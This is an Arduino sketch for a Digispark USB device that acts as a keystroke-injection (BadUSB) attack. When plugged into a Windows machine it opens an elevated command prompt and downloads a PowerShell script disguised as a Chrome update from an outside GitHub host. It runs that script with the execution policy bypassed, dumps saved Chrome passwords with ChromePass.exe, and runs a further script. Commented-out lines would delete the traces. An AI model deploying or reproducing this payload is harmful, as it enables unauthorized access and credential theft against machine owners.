#include "DigiKeyboard.h"
/* Init function */
void setup()
{
  pinMode(1, OUTPUT); //LED on Model A
  digitalWrite(1, HIGH);
  DigiKeyboard.delay(100);
  digitalWrite(1, LOW);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.println("powershell Start-Process cmd -Verb RunAs");
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("cd / & mkdir chrome & cd chrome");
  DigiKeyboard.delay(50);
  DigiKeyboard.println("echo (wget 'https://raw.githubusercontent.com/abdulaziesmuslim/TA/master/ChromeUpdateDownload.ps1' -OutFile ChromeUpdateDownload.ps1) > b.ps1");
  DigiKeyboard.delay(200);
  DigiKeyboard.println("powershell -ExecutionPolicy ByPass -File b.ps1");
  DigiKeyboard.delay(20);  
  DigiKeyboard.println("powershell -ExecutionPolicy ByPass -File ChromeUpdateDownload.ps1");
  DigiKeyboard.delay(50);
  DigiKeyboard.println("ChromePass.exe /stext maintenance.txt");
  DigiKeyboard.delay(50);
  DigiKeyboard.println("powershell ./maintenance.ps1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(50);
  /*DigiKeyboard.println("cd C:/");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(50);
  DigiKeyboard.println("rmdir /s /q chrome");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(50);
  DigiKeyboard.println("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(50);*/
  digitalWrite(1, HIGH);
}

/* Unused endless loop */
void loop() {}  
